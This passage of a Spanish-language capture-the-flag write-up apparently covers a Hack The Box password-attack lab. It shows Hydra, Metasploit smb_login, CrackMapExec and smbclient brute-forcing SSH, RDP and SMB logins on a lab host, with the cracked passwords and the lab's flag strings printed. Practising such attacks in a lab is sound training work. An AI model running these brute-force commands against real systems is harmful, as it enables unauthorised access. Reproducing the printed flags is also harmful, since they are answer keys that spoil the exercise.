[STATUS] 156.00 tries/min, 156 tries in 00:01h, 20958 to do in 02:15h, 14 active
[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar
```

```bash
ssh dennis@10.129.202.136                                   
dennis@10.129.202.136's password: rockstar

(c) 2018 Microsoft Corporation. All rights reserved.

dennis@WINSRV C:\Users\dennis>dir 
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Users\dennis

01/05/2022  08:14 AM    <DIR>          .
01/05/2022  08:14 AM    <DIR>          ..
01/05/2022  08:14 AM    <DIR>          3D Objects  
01/05/2022  08:14 AM    <DIR>          Contacts    
01/05/2022  08:16 AM    <DIR>          Desktop     
01/05/2022  08:14 AM    <DIR>          Documents   
01/05/2022  08:14 AM    <DIR>          Downloads   
01/05/2022  08:14 AM    <DIR>          Favorites   
01/05/2022  08:14 AM    <DIR>          Links       
01/05/2022  08:14 AM    <DIR>          Music       
01/05/2022  08:14 AM    <DIR>          Pictures    
01/05/2022  08:14 AM    <DIR>          Saved Games 
01/05/2022  08:14 AM    <DIR>          Searches    
01/05/2022  08:14 AM    <DIR>          Videos      
               0 File(s)              0 bytes      
              14 Dir(s)  26,291,662,848 bytes free 

dennis@WINSRV C:\Users\dennis>cd Desktop 

dennis@WINSRV C:\Users\dennis\Desktop>dir 
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Users\dennis\Desktop

01/05/2022  08:16 AM    <DIR>          .
01/05/2022  08:16 AM    <DIR>          ..
01/05/2022  08:39 AM                15 flag.txt    
               1 File(s)             15 bytes      
               2 Dir(s)  26,293,751,808 bytes free 

dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt 
HTB{Let5R0ck1t}
```

Accedemos correctamente a la `flag.txt` dentro del escritorio de Dennis 🏆

***

### <mark style="color:purple;">RDP</mark>

Encuentre el usuario del servicio RDP y descifre su contraseña. Luego, cuando inicies sesión, encontrarás la flag en el escritorio.&#x20;

#### Hydra

{% code overflow="wrap" %}

```bash
hydra -L username.list -P password.list rdp://10.129.202.136

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-08 13:54:35
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task
[DATA] attacking rdp://10.129.202.136:3389/

[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.
[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: dennis password: rockstar, continuing attacking the account.
[3389][rdp] host: 10.129.202.136   login: chris   password: 789456123   
                                  |----------------------------------|
```

{% endcode %}

#### Xfreerdp

```shell-session
xfreerdp /v:10.129.202.136 /u:chris /p:789456123
```

<figure><img src="/files/y0tXW82U9ynGEys9Kohy" alt=""><figcaption></figcaption></figure>

Accedemos correctamente a la `flag.txt` dentro del escritorio de Chris  🏆

***

### <mark style="color:purple;">SMB</mark>

Encuentre el usuario del servicio RDP y descifre su contraseña. Luego, cuando inicies sesión, encontrarás la flag en el escritorio.&#x20;

#### Metasploit

```bash
msfconsole -q

msf6 > search smb_login

Matching Modules
================

   #  Name                             Disclosure Date  Rank    Check  Description
   -  ----                             ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_login) > 
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.202.136
rhosts => 10.129.202.136
msf6 auxiliary(scanner/smb/smb_login) > set user_file username.list
user_file => username.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
pass_file => password.list
msf6 auxiliary(scanner/smb/smb_login) > exploit

[*] 10.129.202.136:445    - 10.129.202.136:445 - Starting SMB login bruteforce
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\username.list:password.list',
[!] 10.129.202.136:445    - No active DB -- Credential data will not be saved!
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\username.list:123456',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\username.list:12345',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\username.list:123456789'
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:miguel',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:william',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:thomas',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:beautiful',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:mylove',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:angela',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:poohbear',
[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\reception:patrick',
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\john:november'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\dennis:rockstar'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\chris:789456123'
[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\cassie:12345678910'
```

#### CrackMapExec

```shell-session
afsh4ck@kali$ crackmapexec smb 10.129.202.136 -u cassie -p 12345678910 --shares

SMB         10.129.202.136  445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.202.136  445    WINSRV           [+] WINSRV\cassie:12345678910 
SMB         10.129.202.136  445    WINSRV           [+] Enumerated shares
SMB         10.129.202.136  445    WINSRV           Share           Permissions     Remark
SMB         10.129.202.136  445    WINSRV           -----           -----------     ------
SMB         10.129.202.136  445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.202.136  445    WINSRV           C$                              Default share
SMB         10.129.202.136  445    WINSRV           CASSIE          READ,WRITE      
SMB         10.129.202.136  445    WINSRV           IPC$            READ            Remote IPC
```

#### SMB Client

```shell-session
afsh4ck@kali$ smbclient -U cassie \\\\10.129.202.136\\CASSIE
Password for [WORKGROUP\cassie]: 12345678910

Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Mar  8 14:28:18 2024
  ..                                 DR        0  Fri Mar  8 14:28:18 2024
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022
  flag.txt                            A       16  Thu Jan  6 15:46:14 2022

		10328063 blocks of size 4096. 6416431 blocks available

smb: \> get flag.txt
getting file \flag.txt of size 16 as flag.txt (0,1 KiloBytes/sec) (average 0,1 KiloBytes/sec)
```

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ cat flag.txt                                                     
</strong>HTB{S4ndM4ndB33}
</code></pre>
